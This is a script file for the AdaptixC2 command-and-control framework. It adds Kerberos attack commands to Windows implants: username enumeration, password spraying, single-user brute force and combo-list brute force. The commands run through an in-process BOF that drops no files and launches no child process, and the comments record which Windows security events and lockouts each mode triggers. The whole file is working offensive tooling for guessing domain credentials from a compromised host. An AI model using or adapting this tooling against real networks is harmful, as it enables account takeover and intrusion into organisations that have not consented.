// kerbrute.axs — AdaptixC2 AxScript
//
// In-process Kerberos recon BOF — no child process, no files dropped on target.
// Word lists are read from the OPERATOR machine and forwarded to the BOF.
//
// Built-in help: type any command with no arguments (or with a missing required
// flag) and Adaptix will display the full argument reference automatically.
//
// Deploy: kerbrute.x64.o + this file in the same directory.
//   AxScript → Script Manager → Load new → kerbrute.axs

var metadata = {
    name:        "kerbrute",
    description: "In-process Kerberos recon: userenum, passwordspray, bruteuser, bruteforce",
    store:       true
};

var FLAG_DOWNGRADE = 0x1;
var FLAG_SAFE      = 0x2;
var FLAG_VERBOSE   = 0x4;

function bof_path(id) {
    return ax.script_dir() + "kerbrute." + ax.arch(id) + ".o";
}

function pack_and_exec(id, cmdline, list_b64, domain, dc, single, mode,
                       delay, flags, task_msg) {
    var bof_args = ax.bof_pack("cstr,cstr,cstr,cstr,int,int,int",
        [list_b64, domain, dc || "", single || "", mode, delay || 0, flags || 0]);
    ax.execute_alias(id, cmdline,
        "execute bof " + bof_path(id) + " " + bof_args, task_msg);
}

function build_flags(j) {
    var f = 0;
    if (j["--downgrade"]) f |= FLAG_DOWNGRADE;
    if (j["--safe"])      f |= FLAG_SAFE;
    if (j["-v"])          f |= FLAG_VERBOSE;
    return f;
}

// ─────────────────────────────────────────────────────────────────────────────
// userenum
//
// Sends an unauthenticated AS-REQ for each username.
// No failed-login event (4771). Generates 4768 only if Kerberos logging is on.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_userenum = ax.create_command(
    "userenum",
    "Enumerate valid domain usernames via Kerberos — no pre-auth, no lockout risk",
    "userenum -d contoso.local [--dc 192.168.1.10] [--delay 500] [--downgrade] [--safe] [-v] /path/to/users.txt",
    "Task: [kerbrute] userenum"
);
cmd_userenum.addArgFlagString("-d",   "domain", true,  "Target domain FQDN (e.g. contoso.local)");
cmd_userenum.addArgFlagString("--dc", "dc",     false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_userenum.addArgFlagInt("--delay", "delay",  false, "Sleep this many milliseconds between each attempt");
cmd_userenum.addArgBool("--downgrade",          "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_userenum.addArgBool("--safe",               "Abort all remaining attempts if any account is locked out");
cmd_userenum.addArgBool("-v",                   "Verbose — also log not-found users and errors");
cmd_userenum.addArgFile("userlist", true, "Local path to wordlist — one username per line");

cmd_userenum.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["userlist"],
        parsed_json["domain"],
        parsed_json["dc"],
        "", 0,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        "Task: [kerbrute] userenum → " + parsed_json["domain"]);
});

// ─────────────────────────────────────────────────────────────────────────────
// passwordspray
//
// Tests one password against every user in the list.
// Increments badPwdCount. Generates 4768 and 4771.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_spray = ax.create_command(
    "passwordspray",
    "Test a single password against a list of users — [LOCKOUT RISK]",
    "passwordspray -d contoso.local -p Password123 [--dc 192.168.1.10] [--delay 1000] [--downgrade] [--safe] [-v] /path/to/users.txt",
    "Task: [kerbrute] passwordspray"
);
cmd_spray.addArgFlagString("-d",   "domain",   true, "Target domain FQDN");
cmd_spray.addArgFlagString("--dc", "dc",       false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_spray.addArgFlagString("-p",   "password", true, "Password to spray against every user");
cmd_spray.addArgFlagInt("--delay", "delay",    false, "Sleep this many milliseconds between each attempt");
cmd_spray.addArgBool("--downgrade",            "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_spray.addArgBool("--safe",                 "Abort all remaining attempts if any account is locked out");
cmd_spray.addArgBool("-v",                     "Verbose — also log wrong passwords and errors");
cmd_spray.addArgFile("userlist", true, "Local path to wordlist — one username per line");

cmd_spray.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["userlist"],
        parsed_json["domain"],
        parsed_json["dc"],
        parsed_json["password"],
        1,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        "Task: [kerbrute] spray → " + parsed_json["domain"] + " : " + parsed_json["password"]);
});

// ─────────────────────────────────────────────────────────────────────────────
// bruteuser
//
// Tries every password in the list against one fixed account.
// Stops on the first valid hit or on lockout.
// Increments badPwdCount. Generates 4768 and 4771.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_bruteuser = ax.create_command(
    "bruteuser",
    "Bruteforce a single user's password from a wordlist — stops on first hit  [LOCKOUT RISK]",
    "bruteuser -d contoso.local -u jdoe [--dc 192.168.1.10] [--delay 200] [--downgrade] [--safe] [-v] /path/to/passwords.txt",
    "Task: [kerbrute] bruteuser"
);
cmd_bruteuser.addArgFlagString("-d",   "domain",   true,  "Target domain FQDN");
cmd_bruteuser.addArgFlagString("--dc", "dc",       false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_bruteuser.addArgFlagString("-u",   "username", true,  "Target account sAMAccountName (no @domain suffix)");
cmd_bruteuser.addArgFlagInt("--delay", "delay",    false, "Sleep this many milliseconds between each attempt");
cmd_bruteuser.addArgBool("--downgrade",            "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_bruteuser.addArgBool("--safe",                 "Abort if the account is locked out mid-run");
cmd_bruteuser.addArgBool("-v",                     "Verbose — also log each wrong password attempt");
cmd_bruteuser.addArgFile("passwordlist", true, "Local path to wordlist — one password per line");

cmd_bruteuser.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["passwordlist"],
        parsed_json["domain"],
        parsed_json["dc"],
        parsed_json["username"],
        2,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        "Task: [kerbrute] bruteuser → " + parsed_json["username"] + "@" + parsed_json["domain"]);
});

// ─────────────────────────────────────────────────────────────────────────────
// bruteforce
//
// Reads username:password pairs from a combo file and tests each one.
// Increments badPwdCount. Generates 4768 and 4771.
// ─────────────────────────────────────────────────────────────────────────────
var cmd_bruteforce = ax.create_command(
    "bruteforce",
    "Read username:password combos from a file and test them — [LOCKOUT RISK]",
    "bruteforce -d contoso.local [--dc 192.168.1.10] [--delay 500] [--downgrade] [--safe] [-v] /path/to/combos.txt",
    "Task: [kerbrute] bruteforce"
);
cmd_bruteforce.addArgFlagString("-d",   "domain", true,  "Target domain FQDN");
cmd_bruteforce.addArgFlagString("--dc", "dc",     false, "DC hostname or IP — DNS SRV lookup used if omitted");
cmd_bruteforce.addArgFlagInt("--delay", "delay",  false, "Sleep this many milliseconds between each attempt");
cmd_bruteforce.addArgBool("--downgrade",          "Advertise RC4-only in the etype list (arcfour-hmac-md5)");
cmd_bruteforce.addArgBool("--safe",               "Abort all remaining attempts if any account is locked out");
cmd_bruteforce.addArgBool("-v",                   "Verbose — also log not-found combos and errors");
cmd_bruteforce.addArgFile("combofile", true, "Local path to combo file — username:password per line");

cmd_bruteforce.setPreHook(function(id, cmdline, parsed_json) {
    pack_and_exec(id, cmdline,
        parsed_json["combofile"],
        parsed_json["domain"],
        parsed_json["dc"],
        "",
        3,
        parsed_json["delay"] || 0,
        build_flags(parsed_json),
        "Task: [kerbrute] bruteforce → " + parsed_json["domain"]);
});

// ─────────────────────────────────────────────────────────────────────────────
// Register — Windows beacons only
// ─────────────────────────────────────────────────────────────────────────────
var grp = ax.create_commands_group("Kerbrute",
    [cmd_userenum, cmd_spray, cmd_bruteuser, cmd_bruteforce]);
ax.register_commands_group(grp, ["beacon"], ["windows"], []);
